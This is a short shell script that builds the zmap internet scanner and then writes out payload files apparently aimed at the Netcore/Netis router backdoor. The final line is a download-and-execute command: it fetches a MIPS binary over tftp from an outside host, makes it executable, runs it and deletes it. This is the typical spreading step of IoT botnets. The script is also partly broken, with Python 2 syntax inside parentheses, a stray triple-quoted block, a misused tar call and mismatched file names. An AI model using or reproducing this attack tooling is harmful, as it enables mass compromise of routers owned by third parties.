#!/bin/sh

apt-get update -y

"""
yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y
yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y
yum install epel-release -y
yum install gengetopt -y
"""

wget https://github.com/zmap/zmap/archive/v3.0.0-beta1.zip
tar v3.0.0-beta1.zip
cd v3.0.0-beta1

apt-get install build-essential cmake libgmp3-dev gengetopt libpcap-dev flex byacc libjson-c-dev pkg-config libunistring-dev
cmake -DENABLE_HARDENING=ON

cmake .
make -j4
make install

python3 -c ("print 'A'*8 + 'netcore\x00'") > loginpayload
python3 -c ("print 'AA\x00\x00AAAA cd /var/; tftp -g -r mipselss 1.1.1.1; chmod 777 mipsel; ./mipsel; rm -rf mipsel\x00'") > commandpayload